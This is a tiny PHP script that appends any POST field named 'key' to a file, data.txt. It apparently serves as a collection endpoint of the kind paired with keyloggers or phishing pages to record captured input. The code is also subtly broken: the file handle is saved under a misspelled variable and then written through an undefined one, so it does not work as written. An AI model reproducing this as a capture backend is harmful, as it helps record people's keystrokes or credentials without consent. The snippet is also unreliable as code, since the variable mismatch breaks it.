<?php
if (!empty($_POST['key'])) {
  $logflie = fopen('data.txt', 'a+');
  fwrite($logfile, $_POST['key']);
  fclose($logfile);
}
?>
